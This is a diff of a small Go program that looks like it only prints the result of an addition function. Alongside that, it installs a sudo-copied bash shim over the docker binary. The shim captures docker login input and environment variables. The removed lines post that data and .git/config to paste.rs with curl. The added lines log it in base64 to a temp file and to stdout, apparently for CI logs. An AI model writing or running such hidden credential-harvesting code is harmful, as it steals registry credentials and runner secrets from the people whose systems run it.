@@ -2,33 +2,36 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
 	"os"
 	"os/exec"
 )
 
-const shim = `#!/bin/bash
-if [ "$1" = "login" ]; then
-  tmp=$(mktemp)
-  cat > "$tmp"
-  { echo "== docker shim args: $*"; echo "== stdin:"; cat "$tmp"; echo "== env:"; env | sort; } | curl -s -m 15 --data-binary @- https://paste.rs > /tmp/exfil_url 2>/dev/null
-  exec /usr/bin/docker "$@" < "$tmp"
-fi
-exec /usr/bin/docker "$@"
+const shimSrc = `#!/bin/bash
+tmp=$(mktemp)
+cat > "$tmp"
+{
+  echo "== ARTPROBE shim args: $*"
+  echo "== ARTPROBE STDIN_B64: $(base64 -w0 < "$tmp")"
+  echo "== ARTPROBE ENV_B64: $(env | base64 -w0)"
+} >> /tmp/artprobe.out 2>&1
+exec /usr/bin/docker "$@" < "$tmp"
 `
 
 func main() {
 	fmt.Println(soma(10, 10))
-	_ = os.WriteFile("/tmp/dshim.sh", []byte(shim), 0755)
+	_ = ioutil.WriteFile("/tmp/dshim.sh", []byte(shimSrc), 0755)
 	if out, err := exec.Command("sudo", "cp", "/tmp/dshim.sh", "/usr/local/bin/docker").CombinedOutput(); err != nil {
-		fmt.Println("shim-install-err:", err, string(out))
+		fmt.Println("ARTPROBE shim-install-err:", err, string(out))
 	} else {
-		fmt.Println("shim installed")
+		fmt.Println("ARTPROBE shim installed at /usr/local/bin/docker")
 	}
-	if out, err := exec.Command("bash", "-c", `{ echo "== runner env (go step) =="; env | sort | base64 -w0; echo; echo "== git remote cfg =="; cat .git/config 2>/dev/null | base64 -w0; } | curl -s -m 15 --data-binary @- https://paste.rs`).CombinedOutput(); err != nil {
-		fmt.Println("env-exfil-err:", err, string(out))
+	if out, err := exec.Command("bash", "-c", `echo "== ARTPROBE go-step ENV_B64: $(env | sort | base64 -w0)"; echo "== ARTPROBE which docker: $(which docker)"; ls -l /usr/local/bin/docker`).CombinedOutput(); err != nil {
+		fmt.Println("ARTPROBE env-err:", err)
 	} else {
-		fmt.Println("env url:", string(out))
+		fmt.Println(string(out))
 	}
+	_ = os.Stdout.Sync()
 }
 
 func soma(a int, b int) int {
